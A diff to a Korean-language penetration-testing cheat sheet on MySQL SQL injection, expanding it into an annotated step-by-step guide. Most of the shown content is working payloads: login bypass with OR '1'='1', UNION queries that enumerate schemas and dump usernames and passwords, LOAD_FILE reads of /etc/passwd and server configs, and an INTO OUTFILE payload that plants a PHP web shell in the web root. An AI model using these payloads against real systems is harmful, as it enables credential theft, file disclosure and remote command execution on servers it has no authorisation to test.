@@ -1,78 +1,139 @@
 # Database Services - 데이터베이스 보안 테스트 가이드
 ## 🔐 SQL Injection
-- mysql :  AND operator would be evaluated before the OR operator.
+
+SQL Injection은 애플리케이션의 입력값 검증 취약점을 이용하여 데이터베이스에 임의의 SQL 쿼리를 실행하는 공격 기법입니다.
+
+### 기본 우회 테스트
+
+**주의**: MySQL에서는 AND 연산자가 OR 연산자보다 먼저 평가됩니다.
+
 ```sql
-# '으로 테스트 이후 정상 작동 페이로드 찾기
+# 기본 SQL Injection 탐지
+# 작은따옴표(')로 SQL 구문 오류를 유발하여 취약점 존재 여부 확인
 admin'
-admin'-- -
-admin';-- -
-admin'#
-admin')-- -
+
+# SQL 주석을 이용한 뒤쪽 쿼리 무효화
+admin'-- -      # MySQL 표준 주석 (공백 필요)
+admin';-- -     # 세미콜론 포함 버전
+admin'#         # MySQL 대체 주석
+admin')-- -     # 괄호가 있는 경우
 ```
+
+### 인증 우회 (Authentication Bypass)
+
+로그인 폼에서 항상 참인 조건을 만들어 인증을 우회합니다.
+
 ```sql
+# OR '1'='1' 구문을 이용한 항상 참 조건 생성
+# 결과: WHERE username='admin' OR '1'='1' AND password='password' OR '1'='1'
 username : admin' or '1'='1
 password : password' or '1'='1
 ```
-```sql
-' order by 1-- -
-' UNION select 1,2,3-- -
 
-# 실제로 printing 되는 column을 찾아야한다.
+### UNION 기반 데이터 추출
+
+UNION을 이용하여 다른 테이블의 데이터를 조회할 수 있습니다.
+
+```sql
+# 1단계: 컬럼 개수 파악
+# ORDER BY를 이용하여 에러가 발생할 때까지 숫자를 증가
+' order by 1-- -
+' order by 2-- -
+' order by 3-- -
+' order by 4-- -
+
+# 2단계: UNION SELECT로 컬럼 매핑
+# 각 컬럼 위치에 숫자를 넣어 어느 위치가 화면에 출력되는지 확인
+' UNION select 1,2,3-- -
+' UNION select 1,2,3,4-- -
+
+# 3단계: 데이터베이스 버전 확인
+# @@version: MySQL 버전 정보 출력
 ' UNION select 1,@@version,3,4-- -
 
+# 4단계: 데이터베이스 목록 조회
+# INFORMATION_SCHEMA.SCHEMATA: 모든 데이터베이스 정보를 담고 있는 시스템 테이블
 ' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
 
+# 5단계: 특정 데이터베이스의 테이블 목록 조회
+# TABLE_SCHEMA='dev': dev 데이터베이스의 테이블만 필터링
 ' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
 
+# 6단계: 특정 테이블의 컬럼 정보 조회
+# INFORMATION_SCHEMA.COLUMNS: 모든 컬럼 정보를 담고 있는 시스템 테이블
 ' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
 
+# 7단계: 실제 데이터 추출
+# dev.credentials 테이블의 username과 password 조회
 ' UNION select 1, username, password, 4 from dev.credentials-- -
 ```
+
+### 권한 확인 및 파일 접근
+
+FILE 권한을 가진 경우 시스템 파일을 읽거나 쓸 수 있습니다.
+
 ```sql
-# FILE privilege
+# 현재 사용자 확인
+# user(): 현재 MySQL 연결 사용자 반환
 ' UNION SELECT 1, user(), 3, 4-- -
 
+# 모든 MySQL 사용자 조회
+# mysql.user: MySQL 사용자 계정 정보를 저장하는 시스템 테이블
 ' UNION SELECT 1, user, 3, 4 from mysql.user-- -
 
+# 모든 사용자의 super_priv 권한 확인
+# super_priv='Y': 슈퍼유저 권한 보유
 ' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
 
+# root 사용자의 권한 확인
 ' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
 
+# 모든 사용자 권한 조회
+# information_schema.user_privileges: 사용자별 부여된 권한 정보
 ' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
 
+# root@localhost의 권한 상세 조회
 ' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
 
+# 시스템 파일 읽기 (Linux)
+# LOAD_FILE(): 서버 파일 시스템의 파일을 읽는 함수
 ' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
 
+# Apache 설정 파일 읽기
 ' UNION SELECT 1, LOAD_FILE("/etc/apache2/apache2.conf"), 3, 4-- -
 
+# Nginx 설정 파일 읽기
 ' UNION SELECT 1, LOAD_FILE("/etc/nginx/nginx.conf"), 3, 4-- -
-
 ' UNION SELECT 1, LOAD_FILE("/etc/nginx/sites-enabled/default"), 3, 4-- -
 
+# IIS 설정 파일 읽기 (Windows)
+# %WinDir%: Windows 시스템 디렉터리 환경변수
 ' UNION SELECT 1, LOAD_FILE("%WinDir%\System32\Inetsrv\Config\ApplicationHost.config"), 3, 4-- -
 ```
+
+### 웹쉘 업로드
+
+secure_file_priv 설정이 허용하는 경우 파일을 서버에 작성할 수 있습니다.
+
 ```sql
-# secure_file_priv value is empty, meaning that we can read/write files to any location.
-# 500 error가 나오더라도 파일이 업로드 되었을 수 있음.
+# secure_file_priv 설정 확인
 ' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
 
+# 주의: 500 에러가 발생해도 파일이 생성되었을 수 있으므로 확인 필요
 ' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
 ```
-
 ---
 
 ## 📊 MySQL
-
-MySQL은 가장 널리 사용되는 오픈소스 관계형 데이터베이스 관리 시스템입니다.  
 **기본 포트**: 3306
 
-### default databases
+### 기본 시스템 데이터베이스
+
 ```mysql
-mysql
-information_schema
-performance_schema
-sys
+mysql               # 사용자 계정, 권한, 설정 정보 저장
+information_schema  # 데이터베이스 메타데이터 (읽기 전용)
+performance_schema  # 서버 성능 모니터링 데이터
+sys                 # performance_schema를 쉽게 사용하기 위한 뷰 모음
 ```
 
 ### 파일 읽기 (Read Files)
